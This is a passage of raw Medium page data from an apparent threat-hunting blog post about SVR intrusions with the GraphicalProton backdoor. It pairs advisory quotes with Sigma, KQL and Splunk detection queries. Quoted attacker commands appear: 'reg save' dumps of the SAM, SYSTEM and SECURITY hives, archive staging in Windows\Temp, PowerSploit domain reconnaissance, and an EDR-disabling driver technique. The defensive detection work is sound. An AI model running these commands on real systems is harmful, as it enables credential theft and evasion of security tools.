used as a primary communication channel while Dropbox is treated as a backup channel [T1567]. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files — with both commands and results [T1564.001]. Directory name is re-randomized each time the GraphicalProton process is started.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_47":{"__typename":"Paragraph","id":"f69d26ea209e_47","name":"d878","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FDLL names used by SVR for GraphicalProton backdoor.yml at Russian-Threat-Actor ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":218,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FDLL%20names%20used%20by%20SVR%20for%20GraphicalProton%20backdoor.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":93,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":94,"end":208,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FDLL%20names%20used%20by%20SVR%20for%20GraphicalProton%20backdoor.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*hpzQEddLP7i1b8g4"}},"Paragraph:f69d26ea209e_48":{"__typename":"Paragraph","id":"f69d26ea209e_48","name":"5207","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_49":{"__typename":"Paragraph","id":"f69d26ea209e_49","name":"e60d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceImageLoadEvents | where (FolderPath endswith @’AclNumsInvertHost.dll’ or FolderPath endswith @’ModeBitmapNumericAnimate.dll’ or FolderPath endswith @’UnregisterAncestorAppendAuto.dll’ or FolderPath endswith @’DeregisterSeekUsers.dll’ or FolderPath endswith @’ScrollbarHandleGet.dll’ or FolderPath endswith @’PerformanceCaptionApi.dll’ or FolderPath endswith @’WowIcmpRemoveReg.dll’ or FolderPath endswith @’BlendMonitorStringBuild.dll’ or FolderPath endswith @’HandleFrequencyAll.dll’ or FolderPath endswith @’HardSwapColor.dll’ or FolderPath endswith @’LengthInMemoryActivate.dll’ or FolderPath endswith @’ParametersNamesPopup.dll’ or FolderPath endswith @’ModeFolderSignMove.dll’ or FolderPath endswith @’ChildPaletteConnected.dll’ or FolderPath endswith @’AddressResourcesSpec.dll’)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_50":{"__typename":"Paragraph","id":"f69d26ea209e_50","name":"7c7c","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_51":{"__typename":"Paragraph","id":"f69d26ea209e_51","name":"2eeb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (ImageLoaded=”*AclNumsInvertHost.dll” OR ImageLoaded=”*ModeBitmapNumericAnimate.dll” OR ImageLoaded=”*UnregisterAncestorAppendAuto.dll” OR ImageLoaded=”*DeregisterSeekUsers.dll” OR ImageLoaded=”*ScrollbarHandleGet.dll” OR ImageLoaded=”*PerformanceCaptionApi.dll” OR ImageLoaded=”*WowIcmpRemoveReg.dll” OR ImageLoaded=”*BlendMonitorStringBuild.dll” OR ImageLoaded=”*HandleFrequencyAll.dll” OR ImageLoaded=”*HardSwapColor.dll” OR ImageLoaded=”*LengthInMemoryActivate.dll” OR ImageLoaded=”*ParametersNamesPopup.dll” OR ImageLoaded=”*ModeFolderSignMove.dll” OR ImageLoaded=”*ChildPaletteConnected.dll” OR ImageLoaded=”*AddressResourcesSpec.dll”)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_52":{"__typename":"Paragraph","id":"f69d26ea209e_52","name":"2d4a","type":"H4","href":null,"layout":null,"metadata":null,"text":"Sensitive registry entries saved to file","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_53":{"__typename":"Paragraph","id":"f69d26ea209e_53","name":"af86","type":"BQ","href":null,"layout":null,"metadata":null,"text":"In order to exfiltrate Windows Registry, the SVR saved hives into files [T1003.002], packed them, and then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_54":{"__typename":"Paragraph","id":"f69d26ea209e_54","name":"0e4c","type":"P","href":null,"layout":null,"metadata":null,"text":"C:\\Windows\\Temp\\ directory:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":16,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_55":{"__typename":"Paragraph","id":"f69d26ea209e_55","name":"bc4c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg save HKLM\\SYSTEM “”C:\\Windows\\temp\\1\\sy.sa”” \u002Fy  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_56":{"__typename":"Paragraph","id":"f69d26ea209e_56","name":"c3c4","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg save HKLM\\SAM “”C:\\Windows\\temp\\1\\sam.sa”” \u002Fy  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_57":{"__typename":"Paragraph","id":"f69d26ea209e_57","name":"fee4","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg save HKLM\\SECURITY “”C:\\Windows\\temp\\1\\se.sa”” \u002Fy  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_58":{"__typename":"Paragraph","id":"f69d26ea209e_58","name":"82e4","type":"PRE","href":null,"layout":null,"metadata":null,"text":"powershell Compress-Archive -Path C:\\Windows\\temp\\1\\ -DestinationPath C:\\Windows\\temp\\s.zip -Force & del C:\\Windows\\temp\\1 \u002FF \u002FQ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"less"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_59":{"__typename":"Paragraph","id":"f69d26ea209e_59","name":"8b9f","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FSensitive registry entries saved to file.yml at Russian-Threat-Actor ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FSensitive%20registry%20entries%20saved%20to%20file.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FSensitive%20registry%20entries%20saved%20to%20file.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*0Ck-DZXJsMiL2hS1"}},"Paragraph:f69d26ea209e_60":{"__typename":"Paragraph","id":"f69d26ea209e_60","name":"61ae","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_61":{"__typename":"Paragraph","id":"f69d26ea209e_61","name":"244a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (FolderPath endswith @’reg.exe’ and ProcessCommandLine contains @’save’ and (ProcessCommandLine matches regex @’(?i).*HKLM\\\\SYSTEM.*|.*HKLM\\\\SECURITY.*|.*HKLM\\\\SAM.*’) and (ProcessCommandLine matches regex @’(?i).*sy\\.sa.*|.*sam\\.sa.*|.*se\\.sa.*’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_62":{"__typename":"Paragraph","id":"f69d26ea209e_62","name":"660a","type":"H4","href":null,"layout":null,"metadata":null,"text":"Compressing files from temp to temp","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_63":{"__typename":"Paragraph","id":"f69d26ea209e_63","name":"284e","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FCompressing files from temp to temp.yml at Russian-Threat-Actor ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":203,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FCompressing%20files%20from%20temp%20to%20temp.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":78,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":79,"end":193,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FCompressing%20files%20from%20temp%20to%20temp.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*fhFFfYZU6ifCbDyw"}},"Paragraph:f69d26ea209e_64":{"__typename":"Paragraph","id":"f69d26ea209e_64","name":"6ad9","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_65":{"__typename":"Paragraph","id":"f69d26ea209e_65","name":"1d74","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceEvents | where ActionType == “PowerShellCommand” | where ((AdditionalFields matches regex @’(?i).*Compress\\-Archive.*Path.*Windows\\\\[Tt]{1}emp\\\\[1–9]{1}.*DestinationPath.*Windows\\\\[Tt]{1}emp\\\\.*’) or (InitiatingProcessCommandLine matches regex @’(?i).*Compress\\-Archive.*Path.*Windows\\\\[Tt]{1}emp\\\\[1–9]{1}.*DestinationPath.*Windows\\\\[Tt]{1}emp\\\\.*’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_66":{"__typename":"Paragraph","id":"f69d26ea209e_66","name":"d561","type":"H4","href":null,"layout":null,"metadata":null,"text":"Scheduled tasks names used by SVR for Graphical backdoor","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_67":{"__typename":"Paragraph","id":"f69d26ea209e_67","name":"c36f","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FScheduled tasks names used by SVR for GraphicalProton backdoor command.yml at…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":215,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FScheduled%20tasks%20names%20used%20by%20SVR%20for%20GraphicalProton%20backdoor%20command.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":90,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":91,"end":205,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FScheduled%20tasks%20names%20used%20by%20SVR%20for%20GraphicalProton%20backdoor%20command.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*uiD7R7-2qZDge6VI"}},"Paragraph:f69d26ea209e_68":{"__typename":"Paragraph","id":"f69d26ea209e_68","name":"ae07","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_69":{"__typename":"Paragraph","id":"f69d26ea209e_69","name":"8efb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((EventCode=”4698\" OR EventCode=”4699\" OR EventCode=”4702\") AND (TaskName=”\\\\Microsoft\\\\Windows\\\\IISUpdateService” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsDefenderService” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsDefenderService2\" OR TaskName=”\\\\Microsoft\\\\DefenderService” OR TaskName=”\\\\Microsoft\\\\Windows\\\\DefenderUPDService” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WiMSDFS” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCkeck” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\SubmitReporting” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Defender Update Service” OR TaskName=”\\\\WindowUpdate” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\CheckReporting” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCheck” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Speech\\\\SpeechModelInstallTask” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Filtering Platform\\\\BfeOnServiceStart” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Data Integrity Scan\\\\Data Integrity Update” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck” OR TaskName=”\\\\Microsoft\\\\Windows\\\\ATPUpd” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Service Update” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled Check” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck” OR TaskName=”\\\\Defender” OR TaskName=”\\\\defender” OR TaskName=”\\\\Microsoft\\\\Windows\\\\IISUpdateService” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsDefenderService” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsDefenderService2\" OR TaskName=”\\\\Microsoft\\\\DefenderService” OR TaskName=”\\\\Microsoft\\\\Windows\\\\DefenderUPDService” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WiMSDFS” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCkeck” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\SubmitReporting” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Defender Update Service” OR TaskName=”\\\\WindowUpdate” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\CheckReporting” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCheck” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Speech\\\\SpeechModelInstallTask” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Filtering Platform\\\\BfeOnServiceStart” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Data Integrity Scan\\\\Data Integrity Update” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck” OR TaskName=”\\\\Microsoft\\\\Windows\\\\ATPUpd” OR TaskName=”\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Service Update” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled Check” OR TaskName=”\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck” OR TaskName=”\\\\Defender” OR TaskName=”\\\\defender”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"swift"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_70":{"__typename":"Paragraph","id":"f69d26ea209e_70","name":"b800","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_71":{"__typename":"Paragraph","id":"f69d26ea209e_71","name":"8acb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’schtasks.exe’ and (ProcessCommandLine contains @’IISUpdateService’ or ProcessCommandLine contains @’WindowsDefenderService’ or ProcessCommandLine contains @’WindowsDefenderService2' or ProcessCommandLine contains @’DefenderService’ or ProcessCommandLine contains @’DefenderUPDService’ or ProcessCommandLine contains @’WiMSDFS’ or ProcessCommandLine contains @’StartupAppTaskCkeck’ or ProcessCommandLine contains @’SubmitReporting’ or ProcessCommandLine contains @’Defender Update Service’ or ProcessCommandLine contains @’WindowUpdate’ or ProcessCommandLine contains @’CheckReporting’ or ProcessCommandLine contains @’StartupAppTaskCheck’ or ProcessCommandLine contains @’SpeechModelInstallTask’ or ProcessCommandLine contains @’BfeOnServiceStart’ or ProcessCommandLine contains @’Data Integrity Update’ or ProcessCommandLine contains @’Scheduled AutoCheck’ or ProcessCommandLine contains @’ATPUpd’ or ProcessCommandLine contains @’Service Update’ or ProcessCommandLine contains @’Scheduled Check’ or ProcessCommandLine contains @’Scheduled AutoCheck’ or ProcessCommandLine contains @’Defender’ or ProcessCommandLine contains @’defender’)) or (FolderPath endswith @’schtasks.exe’ and ((ProcessCommandLine matches regex @’(?i).*Defender\\sUpdate\\sService.*’) or (ProcessCommandLine matches regex @’(?i).*Data\\sIntegrity\\sUpdate.*’) or (ProcessCommandLine matches regex @’(?i).*Scheduled\\sAutoCheck.*’) or (ProcessCommandLine matches regex @’(?i).*Service\\sUpdate.*’) or (ProcessCommandLine matches regex @’(?i).*Scheduled\\sCheck.*’) or (ProcessCommandLine matches regex @’(?i).*Scheduled\\sAutoCheck.*’))))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_72":{"__typename":"Paragraph","id":"f69d26ea209e_72","name":"2643","type":"H4","href":null,"layout":null,"metadata":null,"text":"Tactics Used to Avoid Detection","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_73":{"__typename":"Paragraph","id":"f69d26ea209e_73","name":"f8b4","type":"BQ","href":null,"layout":null,"metadata":null,"text":"To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” [T1068] technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software [T1562.001]. This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV\u002FEDR processes for a small subset of victims [T1068].","hasDropCap":true,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_74":{"__typename":"Paragraph","id":"f69d26ea209e_74","name":"b5da","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FEDRSandblast Malicious Driver Detection.yml at Russian-Threat-Actor ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":207,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FEDRSandblast%20Malicious%20Driver%20Detection.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":82,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":83,"end":197,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FEDRSandblast%20Malicious%20Driver%20Detection.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*o-RNDYWtKS9cUvT6"}},"Paragraph:f69d26ea209e_75":{"__typename":"Paragraph","id":"f69d26ea209e_75","name":"9a9b","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_76":{"__typename":"Paragraph","id":"f69d26ea209e_76","name":"7c21","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceFileEvents | where (InitiatingProcessFolderPath endswith @’WNBIOS.sys’ or InitiatingProcessFolderPath endswith @’ntkrnlmp.pdb’ or InitiatingProcessFolderPath endswith @’GDRV.sys’ or InitiatingProcessFolderPath endswith @’RTCore64.sys’ or InitiatingProcessFolderPath endswith @’DBUtil_2_3.sys’)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_77":{"__typename":"Paragraph","id":"f69d26ea209e_77","name":"ae4f","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_78":{"__typename":"Paragraph","id":"f69d26ea209e_78","name":"f321","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (Image=”*WNBIOS.sys” OR Image=”*ntkrnlmp.pdb” OR Image=”*GDRV.sys” OR Image=”*RTCore64.sys” OR Image=”*DBUtil_2_3.sys”)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_79":{"__typename":"Paragraph","id":"f69d26ea209e_79","name":"a94f","type":"H4","href":null,"layout":null,"metadata":null,"text":"Further Recon Hunting and Redteaming opportunities","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_80":{"__typename":"Paragraph","id":"f69d26ea209e_80","name":"47cf","type":"BQ","href":null,"layout":null,"metadata":null,"text":"After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance [T1590.004]. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory [T1046]. The SVR executed the following PowerSploit commands:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_81":{"__typename":"Paragraph","id":"f69d26ea209e_81","name":"cf62","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-NetComputer  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_82":{"__typename":"Paragraph","id":"f69d26ea209e_82","name":"c602","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-NetGroup  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_83":{"__typename":"Paragraph","id":"f69d26ea209e_83","name":"9733","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount”  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_84":{"__typename":"Paragraph","id":"f69d26ea209e_84","name":"2948","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-NetDiDomain  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_85":{"__typename":"Paragraph","id":"f69d26ea209e_85","name":"543a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-AdUser  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_86":{"__typename":"Paragraph","id":"f69d26ea209e_86","name":"0615","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-DomainUser -UserName  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_87":{"__typename":"Paragraph","id":"f69d26ea209e_87","name":"3b2e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-NetUser -PreauthNotRequire  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_88":{"__typename":"Paragraph","id":"f69d26ea209e_88","name":"8d05","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-NetComputer | select samaccountname  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_89":{"__typename":"Paragraph","id":"f69d26ea209e_89","name":"3f5c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Get-NetUser -SPN | select serviceprincipalname","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_90":{"__typename":"Paragraph","id":"f69d26ea209e_90","name":"201e","type":"H4","href":null,"layout":null,"metadata":null,"text":"Living Off The Land and Exploitation Active 